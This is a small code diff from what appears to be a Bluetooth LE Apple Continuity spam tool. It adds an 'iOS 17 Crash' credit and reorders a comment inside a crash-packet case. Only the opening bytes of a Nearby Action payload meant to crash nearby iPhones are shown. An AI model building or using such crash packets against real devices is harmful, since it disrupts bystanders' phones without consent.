@@ -4,6 +4,7 @@
 
 // Hacked together by @Willy-JL
 // Custom adv logic by @Willy-JL (idea by @xMasterX)
+// iOS 17 Crash by @ECTO-1A
 // Extensive testing and research on behavior and parameters by @Willy-JL and @ECTO-1A
 // Structures docs and Nearby Action IDs from https://github.com/furiousMAC/continuity/
 // Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
@@ -139,8 +140,9 @@ void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
         break;
 
     case ContinuityTypeCustomCrash:
-        i -= 2; // Override segment header
+        // Found by @ECTO-1A
 
+        i -= 2; // Override segment header
         packet[i++] = ContinuityTypeNearbyAction; // Type
         packet[i++] = 0x05; // Length
         packet[i++] = 0xC1; // Action Flags
